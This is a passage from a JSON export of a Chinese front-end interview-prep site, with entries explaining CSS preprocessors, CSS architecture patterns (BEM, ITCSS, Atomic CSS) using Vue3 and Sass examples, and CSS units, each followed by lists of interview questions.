官方定义：\n\nScss也是一种基于Ruby的CSS预处理器，它与Sass有很多相似之处，但是它的语法更接近标准CSS，使用花括号和分号。它是一种非常流行的CSS预处理器，与Sass相比，它更容易学习和使用，并且与现有的CSS代码更兼容。\n\n-   个人理解：\n\nScss是Sass的一种语法格式，由2007推出。这还要从sass的规范语法说起，最典型的就是Sass使用缩进来表示代码块。这使部分使用者比较别扭。而产生了Scss，基于花括号和分号的CSS语法格式，使得它更易于阅读和理解。随着时间的推移，Scss逐渐取代了Sass作为Sass的主要语法格式。\n\n#### Less\n\n-   官方定义：\n\nLess是一种基于JavaScript的CSS预处理器，它与Sass和Scss有很多相似之处，但它使用类似CSS的语法，并且更容易学习和使用。Less支持变量、Mixin、嵌套规则等功能，并且可以在客户端和服务器端使用。\n\n-   个人理解：\n\nLess由2009推出，也是提供了一套完整的生态链。它的语法跟sass不同。Less的学习成本更低，更容易理解和编写。此外，Less的编译速度比Sass更快。\n\n#### Stylus\n\n-   官方定义：\n\nStylus是一种基于JavaScript的CSS预处理器，它与Less、Sass和Scss有很多相似之处，但它的语法非常灵活，可以自由选择使用缩进或花括号来表示嵌套和块。Stylus还支持变量、Mixin、函数等功能，并且具有非常强大的插件系统，可以轻松地扩展其功能。\n\n-   个人理解：\n\nStylus也是曾经一个比较完善的预编译语言。 但市场份额却原来越少。个人的观点，一是的学习成本高一些，有入门的门槛。而是生态链的问题，sass跟less的有较完善的生态链，而Stylus更像一个独立的东西。\n\n#### PostCSS\n\n-   官方定义：\n\nPostCSS不是一种独立的CSS预处理器，而是一个CSS处理工具集合，可以通过各种插件扩展其功能。PostCSS可以用于转换CSS语法、提供自动前缀、压缩CSS代码、处理嵌套规则、优化图片等。它不像其他预处理器那样提供自己的语言，而是基于现有的CSS语法。使用PostCSS可以通过插件来实现更多的自定义和灵活性，使其成为一个强大的CSS处理工具。\n\n-   个人理解：\n\n跟上述的其他的处理器不同，PostCSS不应该算是一个预处理器，但却是我们做适配，压缩等处理时的一个选择。\n\n### 数据分析\n\n#### 市场占有率分析\n\n我们借助npm官网统计工具对比，查看less与scss的数据量对比：\n\n链接： [npm-stat.com/charts.html…](https://npm-stat.com/charts.html?package=less \"https://npm-stat.com/charts.html?package=less\") [npm-stat.com/charts.html…](https://npm-stat.com/charts.html?package=sass \"https://npm-stat.com/charts.html?package=sass\")\n\n![image.png](https://static.ecool.fun//article/d249dff1-b234-422a-97f7-7f7b586f858e.awebp)\n\n如上图，左侧为less的数据，右侧为scss的数据。\n\n我们可以通过统计清晰的看到。单单一个sass的下载量，基本达到less的两倍以上。此处还不包含sass阵营的其他工具，包括node-scss，dart-scss的下载量。\n\n可以得出结论：**sass的使用量约为less的几倍**。（但此处有个值得一提的地方：统计为全球的用户量的统计，并非针对国内）\n\n#### 组件库选择分析\n\n从上述的数据中，我们了解到sass的使用量较多，但是国内出名的组件库，却是less居多。毕竟组件库，也代表我们的使用习惯之一。我们一起看看组件库的选择。\n\n-   ant design\n\n选择了Less，地址：[www.antdv.com/docs/vue/cu…](https://www.antdv.com/docs/vue/customize-theme-cn \"https://www.antdv.com/docs/vue/customize-theme-cn\")\n\n![image.png](https://static.ecool.fun//article/a11b68cf-c20a-4d92-945a-087d9f32f26d.awebp)\n\n-   element\n\n选择了scss，地址：[element.eleme.io/#/zh-CN/com…](https://element.eleme.io/#/zh-CN/component/custom-theme \"https://element.eleme.io/#/zh-CN/component/custom-theme\")\n\n![image.png](https://static.ecool.fun//article/d0dfd4f7-e823-4c84-871e-247b3283b32e.awebp)\n\n-   varlet\n\n选择了Less，地址：[varlet.gitee.io/varlet-ui/#…](https://varlet.gitee.io/varlet-ui/#/zh-CN/migrationGuide \"https://varlet.gitee.io/varlet-ui/#/zh-CN/migrationGuide\")\n\n![image.png](https://static.ecool.fun//article/2b446668-1e6b-4c69-b258-137101992b15.awebp)\n\n-   vant\n\n选择了Less，地址：[vant-contrib.gitee.io/vant/v3/#/z…](http://vant-contrib.gitee.io/vant/v3/#/zh-CN/theme \"http://vant-contrib.gitee.io/vant/v3/#/zh-CN/theme\")\n\n![image.png](https://static.ecool.fun//article/1931c498-dcaf-4e86-9170-b882175481e0.awebp)\n\n结论：关于组件库的选择，Less还是占大多数，当然Scss也是部分组件库的选择。\n\n### 个人分析\n\n#### 相同点\n\n-   都属于css语法编译的工具。\n-   工具提供的方法也很多雷同。如都支持嵌套，都支持混合器（Mixin），都支持扩展（Extend），都支持颜色函数，都支持变量等等。\n-   生态链都一致丰富，常用构建工具都基本支持，如webpack，vite, rollup等。\n-   社区支持都强，提供了大量的插件、工具和资源，可以帮助开发者更好地使用Sass。\n-   目的性也一致，都提高了CSS编写的效率和可维护性而产生。\n\n#### 不同点\n\n-   部分语法不同，如Sass 和 SCSS 中的变量使用 `$` 符号进行定义和引用，而不是 Less 中使用的 `@` 符号\n-   Sass 和 Scss 还提供了一些 Less 没有的特性，例如控制流语句和继承等。\n-   Sass 和 Scss 是基于Ruby或者Dart，Node的预处理器，他需要借助机器安装这些环境来支持。而Less, 是基于JavaScript的CSS预处理器，引入一段JS即可编译，有浏览器还是服务端，他都能编译。\n-   虽然都有强大的社区，生态链。但总体还是Scss更丰富一些。\n\n#### 特性分析\n\n-   Node-Sass 在国内有一定的兼容性问题，但是基于Dart 语言编写的 Dart Sass以及解决了这个问题。还在使用Node-Sass的建议切换Dart Sass。\n-   Less 的语法相对于 Sass 更加简洁，易于学习和理解。这使得 Less 在国内开发者中更受欢迎，尤其是对于那些不太熟悉预处理器语言的开发者来说。\n-   Sass的阵营更丰富，使用量更高一些，市场份额也更加稳定。除了发家早，这也得益于生态圈，例如 Bootstrap、Foundation、Bulma、Vue.js 等，都在曾经的版本自带了Sass。\n-   国内组件库，还是Less居多，很多\"高级前端\"， 都觉得less 一直都比 sass 要稳定。至少不会出现Node版本，Python版本不一致等问题。\n\n### 结语\n\n所以Sass与Less谁更强？估计短期还是分不出成败。\n\n个人的观点，Sass类似足球，Less类似篮球。两者都是人们喜欢的运动之一。\n\n全球范围内，足球（Sass）受众更广泛，但在一些国家和地区（如中国），篮球（Less）可能更受欢迎。",
    "testPoint": "### 1. **预处理器的基本概念**\n   - **什么是 CSS 预处理器？**：让候选人简要解释 CSS 预处理器的概念，并说明其作用。\n   - **优缺点**：使用预处理器与原生 CSS 相比有哪些优势和缺点？在什么情况下会选择使用预处理器？\n\n### 2. **变量和嵌套**\n   - **变量的使用**：如何在预处理器中定义和使用变量？使用变量可以带来哪些好处？\n   - **嵌套规则**：如何使用嵌套简化代码？在 Sass 或 LESS 中，嵌套深度的最佳实践是什么？嵌套过深会导致哪些问题？\n\n### 3. **Mixin（混合）**\n   - **Mixin 的概念**：什么是 Mixin？如何使用 Mixin 来实现代码复用？\n   - **参数化 Mixin**：如何定义带参数的 Mixin？请举例说明如何在不同场景下复用带参数的 Mixin。\n   - **与变量的区别**：Mixin 与变量相比有哪些优缺点？在什么情况下适合使用 Mixin？\n\n### 4. **继承（Extend）**\n   - **继承的作用**：预处理器中如何使用 `@extend` 实现继承？这种继承方式与 Mixin 的区别是什么？\n   - **优缺点**：`@extend` 的优缺点是什么？什么时候更适合使用 `@extend` 而不是 Mixin？\n\n### 5. **条件与循环**\n   - **条件语句**：如何使用 `@if`、`@else` 在预处理中实现条件判断？在哪些场景下条件语句很有用？\n   - **循环语句**：如何使用 `@for`、`@each`、`@while` 等循环语句？循环可以在哪些场景下提高代码的简洁性和复用性？\n   - **动态生成样式**：通过循环生成大量样式规则时，如何控制生成的选择器，避免影响性能？\n\n### 6. **模块化与分片管理**\n   - **文件分片**：在预处理器中如何使用 `@import` 将样式拆分为多个文件？模块化的样式结构有哪些好处？\n   - **依赖管理**：在大型项目中如何管理和组织多个模块？是否有 `@import` 的替代方案（如 Sass 中的 `@use`）？\n   - **命名空间**：如何利用命名空间避免样式冲突？在使用 `@use` 和 `@forward` 时，命名空间的管理方式是什么？\n\n### 7. **函数（Function）**\n   - **自定义函数**：如何在预处理器中定义和使用函数？与 Mixin 有何不同？\n   - **内置函数**：Sass 或 LESS 中有哪些常用的内置函数？请举例说明常用函数如颜色操作（如 `lighten`、`darken`）、数学计算函数的应用场景。\n\n### 8. **颜色和单位的操作**\n   - **颜色函数**：如何使用 `darken`、`lighten`、`adjust-hue` 等颜色函数动态调整颜色？这些颜色操作在设计系统中如何帮助实现主题切换？\n   - **单位转换**：如何通过 `px` 到 `rem` 的单位转换，使样式在不同设备上更具响应性？\n\n### 9. **响应式设计**\n   - **媒体查询的简化**：在预处理器中如何通过变量或 Mixin 简化媒体查询的书写？如何为不同屏幕尺寸定义响应式 Mixin？\n   - **栅格系统实现**：是否可以在 Sass 或 LESS 中构建简单的栅格系统？如何通过 Mixin 生成栅格布局，简化响应式设计？\n\n### 10. **预处理器中的最佳实践**\n   - **控制嵌套层级**：在 Sass 或 LESS 中，如何控制嵌套层级来防止代码冗长？推荐的嵌套深度是多少？\n   - **模块化与复用**：在大型项目中，如何通过变量、Mixin 和函数等实现复用和模块化？\n   - **编码规范**：如何保证使用预处理器的代码具有良好的可维护性？是否有推荐的代码规范？\n\n### 11. **编译与构建**\n   - **预处理器的编译**：如何编译 Sass 或 LESS 文件？在构建工具中（如 Webpack）集成预处理器时，有哪些插件可用？\n   - **编译效率优化**：在使用预处理器的大型项目中，如何加快编译速度？使用部分编译（如 Dart Sass 中的即时编译模式）有何优势？\n\n### 12. **预处理器的替代方案**\n   - **原生 CSS 功能的提升**：随着 CSS 变量、`@custom-media`、`@property` 等原生功能的发展，哪些预处理器的功能可以直接通过原生 CSS 实现？\n   - **CSS-in-JS 的对比**：相较于 Sass 或 LESS 等传统预处理器，CSS-in-JS 方案的优势是什么？什么时候适合选择 CSS-in-JS 而非传统预处理器？",
    "exerciseKeyList": "[\"ad2a65d2-9330-4f65-9be7-b61e11e10c02\",\"e894262c-f9eb-495b-bb45-5016337f3af1\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 20,
    "createAt": "2024-10-10T08:40:37.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "ad2a65d2-9330-4f65-9be7-b61e11e10c02",
        "title": "CSS预处理器/后处理器是什么？为什么要使用它们？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T05:59:33.000Z",
        "updateAt": "2024-08-10T17:06:45.000Z"
      },
      {
        "exerciseKey": "e894262c-f9eb-495b-bb45-5016337f3af1",
        "title": "Sass、Less 是什么？为什么要使用他们？ ",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T06:18:13.000Z",
        "updateAt": "2024-08-10T17:06:45.000Z"
      }
    ]
  },
  "130": {
    "id": 130,
    "tagId": 11,
    "title": "架构",
    "explanation": "## 前言\n\n在项目中经常存在如下问题：\n\n-   1.模块拆分不合理\n-   2.变量和函数命名不知所云\n-   3.缺少注释或者是写了一堆描述不清的内容\n-   4.重复的代码遍布各个角落等\n\n因为这些不良的编程习惯，导致了项目越来越难以维护，程序性能越来越低，大大降低了日常的工作效率以及提高了公司的开发成本。\n\n下面就以CSS在Vue3项目中的架构为切入点，通过减少CSS代码的冗余度和增强CSS代码的维护性、扩展性来提高我们的编程能力和项目架构能力。\n    \n\n## CSS的设计模式\n\n在学习CSS架构之前，我们先简单看一下常见的5种CSS设计模式，这些设计模式都为我们的CSS架构提供了一定的开发思路。  \n  \n\n### 1.OOCSS模式\n\nOOCSS(Object-Oriented CSS)字面意思是面向对象的CSS，在开发中它有如下的规范约定\n\n-   减少对 HTML 结构的依赖\n\n```shell\n# bad\n# 1.匹配效率低，影响css性能\n# 2.和html耦合度高，维护性和扩展性低\n.container-list ul li a {}\n\n<div class=\"container-list\">\n  <ul>\n    <li>\n      <a>...</a>\n    </li>\n  </ul>\n</div>\n\n\n# good\n.container-list .list-item {}\n\n<div class=\"container-list\">\n  <ul>\n    <li>\n      <a class=\"list-item\">...</a>\n    </li>\n  </ul>\n</div>\n```\n\n-   增加样式的复用性\n\n```shell\n.label {\n  # 公共代码\n}\n.label-danger {\n  # 特定代码\n}\n.label-info {\n  # 特定代码\n}\n<div>\n  <p class=\"label label-danger\"></p>\n  <p class=\"label label-info\"></p>\n</div>\n```\n\n  \n  \n\n### 2.BEM模式\n\nBEM 是进阶版的OOCSS，是一个分层系统，它把我们的网站分为三层，这三层正好对应着 BEM 三个英文单词的简写 block, element, modifier，分为为 块层、元素层、修饰符层。\n\n把 BEM 体现到代码上，我们需要遵循三个原则：\n\n-   使用\\_\\_两个下划线将块名称与元素名称分开\n-   使用--两个破折号分隔元素名称及其修饰符\n-   一切样式都是一个类，不能嵌套。\n\n```shell\n<div class=\"menu\">\n  <div class=\"menu__tab menu__tab--style1\">tab1</div>\n  <div class=\"menu__tab menu__tab--style1\">tab2</div>\n</div>\n```\n\n但是，由于两个下划线\\_\\_和两个破折号--在实际开发中不是那么的顺手，影响开发效率，不过要严格控制CSS命名规范的话，这无疑是一个好的选择。并且在写CSS的时候我们可以通过Sass的混合指令封装一个BEM.scss文件来减少类名的输入以及增强CSS结构  \n  \n\n### 3.SMACSS模式\n\nBEM 简单的三层分法，在应对小中型网站没有问题，但是去应对复杂网站的样式可能就比较困难了，我们需要寻求一个更好的办法。\n\nSMACSS(Scalable and Modular Architecture for CSS)是要编写模块化、结构化和可扩展的 CSS。它对项目中的CSS分为五大类\n\n-   Base: 默认属性样式重置，知名库为normalize.css\n-   Layout：布局样式\n-   Modules：可复用模块的样式，比如一些列表展示\n-   State：状态样式，比如按钮的置灰或高亮的展示\n-   Theme：皮肤样式，比如有些网站具有换肤的功能  \n      \n    \n\n### 4.ITCSS模式\n\nITCSS(Inverted Triangle Cascading Style Sheets)可以翻译为`\"倒三角CSS\"`，它基于分层的概念把我们项目中的样式分为七层\n\n-   Settings: 项目样式变量，如主题色、字体等\n-   Tools：工具类样式，比如定义一个函数，表示字数过多出现省略号等\n-   Generic：重置和/或标准化样式、框大小定义等，对应的是normalize.css\n-   Base：重置浏览器元素属性默认值\n-   Objects：维护OOCSS的样式\n-   Components：公共组件样式\n-   Trumps：让样式权重变得最高，实用程序和辅助类，能够覆盖三角形中前面的任何内容，唯一 important! 的地方  \n      \n    \n\n### 5.ACSS模式\n\nACSS(Atomic CSS)翻译为`\"原子化CSS\"`，是一种 CSS 的架构方式，它倾向于小巧且用途单一的 class，并且会以视觉效果进行命名。是一个不强调逻辑，而更侧重表现的一门所见即所得的语言，它出现的背景是——前端组件化时代的到来，各个组件的CSS可以做到互相独立，互不影响。因此就有这样的代码出现\n\n```html\n<button class=\"bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded\">按钮</button>\n```\n\n目前市场上比较成熟的ACSS库有：[Tailwind CSS](https://tailwindcss.com/ \"https://tailwindcss.com/\")和[Windi CSS](https://cn.windicss.org/ \"https://cn.windicss.org/\")\n\n**ACSS的优点**\n\n-   CSS文件停止增长：使用传统方法，每次添加新功能时，您的 CSS 文件都会变大。使用实用程序，一切都是可重用的，因此您很少需要编写新的 CSS，一套样式全局通用。\n-   不再浪费精力命名，不再添加愚蠢的类名：例如 sidebar-inner-wrapper 只是为了能够设置样式，也不再为真正只是一个 flex 容器的东西的完美抽象名称而苦恼。\n-   灵活，易读：CSS 是全球性的，当你做出改变时，你永远不知道你破坏了什么。HTML 中的类是本地的，因此可以 插拔式改变样式 而不必担心其他问题，CSS 样式很多缩写更加符合大脑的记忆。\n-   永远不用担心命名冲突，永远不用担心样式覆盖。\n\n**ACSS的缺点**\n\n-   会增加HTML 的体积\n-   破坏了CSS命名的语义化\n-   熟悉命名 ACSS 命名会有一定成本\n\n综上，我们可以看出ACSS 劣处是非常小的，而好处有非常大，没有理由在项目中不适用。下面我们通过使用BEM、ITCSS和ACSS模式打造一套CSS架构方案。  \n  \n\n## 项目搭建\n\n### 创建vue3项目和安装依赖\n\n-   1.创建vue3项目\n-   2.安装：`npm i sass@1.26.5 sass-loader@8.0.2 --save`  \n      \n    \n\n### CSS目录结构展示与说明\n\n```shell\nsrc\n  style\n    acss         # 存放boder、margin、padding等基于acss模式的代码\n    base         # 存放元素(input、p、h1等)的重置样式\n    settings     # 存放项目统一规范的文本颜色、边框颜色等变量\n    theme        # 存放项目特定主题下的元素样式\n    tools        # 存放封装好的mixin(混合指令)和function(函数)样式\n    global.scss  # 需要项目全局引用的CSS\n    index.scss   # 需要Vue文件引用的CSS\n```\n\n1.关于mixin(混合指令)和function(函数)的区别\n\n-   函数是有计算逻辑，返回计算的结果，不输出css块\n-   mixin主要是根据计算结果输出css块\n\n```css\n/* mixin */\n@mixin center-translate($direction: both) {\n  position: absolute;\n  @if $direction == both {\n    top: 50%;\n    left: 50%;\n    transform: translate3d(-50%, -50%, 0);\n  } @else if $direction == horizontal {\n    left: 50%;\n    transform: translate3d(-50%, 0, 0);\n  } @else if $direction == vertical {\n    top: 50%;\n    transform: translate3d(0, -50%, 0);\n  }\n}\n\n/* function */\n@function am($module, $trait: false) {\n  @if $trait==false {\n    @return '[am-' + $module + ']';\n  } @else {\n    @return '[am-' + $module + '~=\"' + $trait + '\"]';\n  }\n}\n```\n\n  \n\n2.关于style/global.scss和style/index.scss\n\n-   global.scss中导入的代码不仅在Vue文件中使用，而且在style中scss定义文件里也会被引用到\n\n```css\n# style/global.scss\n@import \"./settings/var.scss\";\n\n# style/settings/var.scss\n$background-color-primary: #F1F1F1;\n$background-color-secondary: $color-white;\n\n# style/acss/color.scss\n@each $style in (primary $background-color-primary, secondary $background-color-secondary) {\n  [bg-#{nth($style, 1)}] {\n    background-color: #{nth($style, 2)};\n  }\n}\n```\n\n-   全局引入style/global.scss\n\n```js\n// 根目录下：vue.config.js\nmodule.exports = {\n  css: {\n    loaderOptions: {\n      scss: {\n        // @/ 是 src/ 的别名\n        // 注意：在 sass-loader v8 中，这个选项名是 \"prependData\"\n        prependData: `@import \"@/style/global.scss\";`\n      },\n    }\n  }\n}\n```\n\n-   style/index.scss定义的代码只是不被style中其他css文件引用到而已，其他的都和global.scss一致\n-   引入style/index.scss\n\n```js\n// src/main.js\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport router from './router'\nimport './style/index.scss'\n\ncreateApp(App).use(router).mount('#app')\n```\n\n下面简单分析和演示下各个style目录中的代码作用。  \n  \n\n### 1.acss\n\n该目录主要是定义一些简单的border、color、font-size、margin和padding等代码\n\n```css\n/* style/acss/border.scss */\n@for $i from 1 through 100 {\n  [radius#{$i}] { \n    border-radius: #{$i}Px;\n    overflow: hidden;\n  }\n}\n[circle] {\n  border-radius: 50%;\n}\n\n/* style/acss/font-size.scss */\n@for $i from 12 through 30 {\n  [fz#{$i}] { \n    font-size: #{$i}px;\n  }\n}\n```\n\n使用acss代码\n\n```html\n<div class=\"container\">\n  <div class=\"item\" radius20>border-radius: 20px;</div>\n</div>\n<div class=\"container\">\n  <div class=\"item\" circle>border-radius: 50%;</div>\n</div>\n<div class=\"container\">\n  <div class=\"item\" fz30>font-size: 30px;</div>\n</div>\n```\n\n  \n  \n\n### 2.base\n\n该目录主要是重置项目中一些元素的默认样式，比如input、hn、p、a等元素\n\n```css\n/* style/base/form.scss */\ninput {\n  padding: 0;\n  outline: none;\n  border: none;\n}\n\n/* style/base/link.scss */\na {\n  color: #ccc;\n  text-decoration: none;\n}\n```\n\n  \n  \n\n### 3.settings\n\n该目录是定义全局的、项目统一规范的文本颜色、边框颜色等变量\n\n```css\n/* style/settings/var.scss */\n/* 主题色调 */\n$color-primary: #FF5777;\n$color-white: #FFFFFF;\n\n/* 文本色调 */\n$color-text-primary: green;\n$color-text-secondary: #FF4533;\n$color-text-tertiary: $color-white;\n$color-text-quaternary: $color-primary;\n\n/* 盒子边框色调 */\n$border-color-base: #E5E5E5;\n\n/* 盒子背景色色调 */\n$background-color-primary: #F1F1F1;\n$background-color-secondary: $color-white;\n$background-color-tertiary: $color-primary;\n\n\n/* 盒子默认边框 */\n$border-width-base: 1Px !default;\n$border-style-base: solid !default;\n$border-base: $border-width-base $border-style-base $border-color-base !default;\n```\n\n  \n  \n\n### 4.theme\n\n该目录定义项目各个主题下相关模块的样式\n\n```css\n/* style/theme/default.scss */\n[data-theme='default'] .header {\n  background: #FF5777;\n}\n[data-theme='default'] .footer {\n  color: #FF5777;\n  border: 2px solid #FF5777;;\n}\n\n/* style/theme/cool.scss */\n[data-theme='cool'] .header {\n  background: #409EFF;\n}\n[data-theme='cool'] .footer {\n  color: #409EFF;\n  border: 2px solid #409EFF;;\n}\n```\n\n我们通过添加html元素上的data-theme属性和值，即可达到项目主题的变换\n\n```html\n<!-- Theme.vue -->\n<template>\n  <div class=\"theme\">\n    <div class=\"header\"></div>\n    <div class=\"theme__set\">\n      <div class=\"set set--default\" @click=\"changeTheme('default')\"></div>\n      <div class=\"set set--cool\" @click=\"changeTheme('cool')\"></div>\n    </div>\n    <div class=\"footer\"></div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: \"Theme\",\n  setup() {\n    const changeTheme = (theme = 'default') => {\n      window.document.documentElement.setAttribute(\"data-theme\", theme);\n    }\n    return {\n      changeTheme\n    }\n  }\n}\n</script>\n\n\n<!-- Other.vue -->\n<template>\n  <div class=\"about\">\n    <div class=\"header\"></div>\n    <div class=\"about-title\">This is an about page title</div>\n    <div class=\"about-content\">This is an about page content</div>\n    <div class=\"footer\"></div>\n  </div>\n</template>\n```\n\n  \n  \n\n### 5.tools\n\n该目录是定义一些全局的公共mixin和function，目前这块内容比较完善就是[SassMagic](https://github.com/W3cplus/SassMagic \"https://github.com/W3cplus/SassMagic\")，感兴趣的可以点进来看一下。下面简单看一下BEM模式的应用\n\n```scss\n$elementSeparator: '__';\n$modifierSeparator: '--';\n\n// 判断`$selector`中是否包含BEM中Modify\n@function containsModifier($selector) {\n  $selector: selectorToString($selector);\n  @if str-index($selector, $modifierSeparator) {\n    @return true;\n  } @else {\n    @return false;\n  }\n}\n\n// 将`$selector`转换成String\n@function selectorToString($selector) {\n  $selector: inspect($selector); //cast to string\n  $selector: str-slice($selector, 2, -2); //remove brackets\n  @return $selector;\n}\n\n// @param  {String}  $selector\n@function getBlock($selector) {\n  $selector: selectorToString($selector);\n  $modifierStart: str-index($selector, $modifierSeparator) - 1;\n  @return str-slice($selector, 0, $modifierStart);\n}\n\n@mixin b($block) {\n  .#{$block} {\n    @content;\n  }\n}\n\n@mixin e($element) {\n  $selector: &;\n  @if containsModifier($selector) {\n    $block: getBlock($selector);\n    @at-root {\n      #{$selector} {\n        #{$block + $elementSeparator + $element} {\n          @content;\n        }\n      }\n    }\n  } @else {\n    @at-root {\n      #{$selector + $elementSeparator + $element} {\n        @content;\n      }\n    }\n  }\n}\n\n@mixin m($modifier) {\n  @at-root {\n    #{&}#{$modifierSeparator + $modifier} {\n      @content;\n    }\n  }\n}\n\n// @param {string} $block - BEM中的Block\n// <div class=\"block\">\n//   <div class=\"block__header\">\n//     <div class=\"block__header--css\"></div>\n//   </div>\n// </div>\n\n//  @include b(block) {\n//    background: red;\n//    @include e(header){\n//       font-size: 14px;\n//       @include m(css) {\n//         font-size: 18px;\n//      }\n//   };\n// }\n\n// 编译后\n// .block {\n//   background: red;\n// }\n// .block__header {\n//   font-size: 14px;\n// }\n// .block__header--css {\n//   font-size: 18px;\n// }\n```\n\n> 原文：https://juejin.cn/post/7058968306048303111",
    "testPoint": "### **1. CSS 架构的基本概念**\n   - **问题**：\n     - 什么是 CSS 架构？为什么需要在项目中构建 CSS 架构？\n     - 面对复杂项目，直接写样式会出现什么问题？CSS 架构如何解决这些问题？\n\n### **2. 常见的 CSS 架构方法论**\n#### **BEM（Block Element Modifier）**\n   - **问题**：\n     - 什么是 BEM？请解释 Block、Element、Modifier 的含义。\n     - BEM 的命名规则是什么？如何在大型项目中保持一致性？\n     - BEM 的优缺点是什么？在实际项目中遇到过哪些挑战？\n     - 举例：请写出一个按钮组件的 HTML 和 BEM 风格的 CSS。\n\n#### **OOCSS（Object-Oriented CSS）**\n   - **问题**：\n     - 什么是 OOCSS？核心思想是什么？\n     - 如何将样式拆分为“结构（Structure）”和“皮肤（Skin）”？\n     - 在 OOCSS 中，如何实现组件复用？有什么典型的例子？\n\n#### **SMACSS（Scalable and Modular Architecture for CSS）**\n   - **问题**：\n     - 什么是 SMACSS？SMACSS 提倡将样式分为哪些类别？\n     - 在使用 SMACSS 时，如何区分模块化样式与主题样式？\n     - SMACSS 与 BEM 的主要区别是什么？\n\n#### **Atomic CSS**\n   - **问题**：\n     - 什么是 Atomic CSS？它的核心思想是什么？\n     - 使用原子化 CSS 有哪些优点和缺点？\n     - Tailwind CSS 是如何实现原子化的？\n     - 面对复杂场景时，Atomic CSS 会不会导致难以维护？如何解决？\n\n#### **ITCSS（Inverted Triangle CSS）**\n   - **问题**：\n     - ITCSS 的核心理念是什么？为什么叫“倒三角”？\n     - ITCSS 的层级划分是什么（如全局样式、工具类、组件样式等）？\n     - 如何在实际项目中使用 ITCSS？\n\n#### **Utility-First CSS**\n   - **问题**：\n     - 什么是 Utility-First CSS？与传统 CSS 架构相比有何不同？\n     - 在使用工具类 CSS（如 Tailwind CSS）时，如何保持样式的可维护性？\n     - Utility-First CSS 是否会影响代码的可读性？如何权衡？\n\n### **3. CSS 模块化**\n   - **问题**：\n     - 如何在大型项目中组织 CSS 文件？是否有推荐的目录结构？\n     - CSS Modules 是什么？与传统的全局 CSS 有什么不同？\n     - 在 CSS Modules 中，如何处理全局样式和模块化样式的冲突？\n     - 使用 CSS-in-JS 和模块化 CSS 各有哪些优缺点？\n\n### **4. 代码复用与可维护性**\n   - **问题**：\n     - 如何在 CSS 架构中实现代码复用？Mixin、变量、函数的使用场景有哪些？\n     - 在团队协作中，如何制定样式规范以保证样式一致性？\n     - 当项目规模变大时，如何避免样式冲突和冗余？\n\n### **5. 响应式设计与适配**\n   - **问题**：\n     - 在 CSS 架构中，如何高效地支持响应式设计？\n     - 栅格系统（Grid System）如何在架构中发挥作用？\n     - 如何在样式体系中支持多主题（如暗黑模式和浅色模式）？\n\n### **6. 样式的动态化**\n   - **问题**：\n     - 动态样式（如主题切换）如何与 CSS 架构结合？\n     - 使用 CSS 变量（Custom Properties）如何提升架构的灵活性？\n     - 动态样式切换与预处理器（如 Sass）能否配合使用？\n\n### **7. 架构的性能优化**\n   - **问题**：\n     - 在 CSS 架构中，如何避免样式的层叠和优先级问题导致的性能问题？\n     - 如何利用关键路径渲染（Critical Path Rendering）优化首屏加载速度？\n     - 使用工具（如 PurgeCSS）清理无用样式时，有哪些注意事项？\n\n### **8. 架构与工具链集成**\n   - **问题**：\n     - 如何在 Webpack、Vite 等工具链中集成 CSS 模块化或预处理器？\n     - 使用 PostCSS 时，如何配置插件以支持现代 CSS 特性？\n     - 在构建过程中，如何自动化地生成架构规范（如 CSS 命名规则）？\n\n### **9. 代码实践问题**\n   - **问题**：\n     - 如果给你一个已有的样式文件，其中没有任何架构，请设计一个合理的架构来重构。\n     - 如何为一个表单组件设计 CSS 架构，使其支持主题切换和响应式设计？\n     - 在多团队协作下，如何通过 CSS 架构实现代码风格的统一？\n\n### **10. 架构的迭代与演进**\n   - **问题**：\n     - 随着项目增长，CSS 架构需要不断调整。你是否参与过架构调整？遇到过什么问题？\n     - 如果团队中不同成员使用不同的命名规则或框架风格，你会如何规范化？\n",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 3.5,
    "pointOrder": 21,
    "createAt": "2024-10-10T08:43:50.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "131": {
    "id": 131,
    "tagId": 11,
    "title": "单位",
    "explanation": "说起CSS单位，我们最熟悉的可能就是像素单位（px），它是一个绝对单位，也就是说一个10px的文字，放在哪里都是一样大的。单位可以影响颜色、距离、尺寸等一系列的属性。CSS中单位的形式有很多种，下面就分别来看看这些单位。 ![](https://static.ecool.fun//article/69d39392-cc5b-4775-9e98-da7eb1c22f86.jpeg)\n\n### 1\\. 相对单位\n\n相对单位就是相对于另一个长度的长度。CSS中的相对单位主要分为两大类：\n\n-   字体相对单位，他们都是根据font-size来进行计算的。常见的字体相对单位有：em、rem、ex、ch；\n-   视窗相对单位，他们都是根据视窗大小来决定的。常见的视窗相对单位有vw、vh、vmax、vmin。\n\n下面就来看看这些常见的CSS单位。\n\n#### （1）em 和 rem\n\nem是最常见的相对长度单位，适合基于特定的字号进行排版。根据CSS的规定，1em 等于元素的font-size属性的值。\n\nem 是相对于父元素的字体大小进行计算的。如果当前对行内文本的字体尺寸未进行显示设置，则相对于浏览器的默认字体尺寸。当DOM元素嵌套加深时，并且同时给很多层级显式的设置了font-size的值的单位是em，那么就需要层层计算，复杂度会很高。\n\n当然，上面的这个说法是不严谨 的。来看一个例子：\n\n```css\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n    <style>\n        .parent {\n            width: 300px;\n            height: 300px;\n            font-size: 20px;\n        }\n        .child {\n            border: 1em solid ;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"parent\">\n        <div class=\"child\">\n           子元素\n        </div>\n    </div>\n</body>\n</html>\n\n```\n\n这里给父元素设置了字体大小为20px，然后给子元素的border宽度设置为1em，这时，子元素的border值为20px，确实是相对于父元素的字体大小设置的：\n\n![image.png](https://static.ecool.fun//article/db93b34a-0630-4738-bc5b-67a9c26d9dca.jpeg)\n\n那如果我们给子元素的字体设置为30px：\n\n```css\n.child {\n  font-size: 30px;\n  border: 1em solid 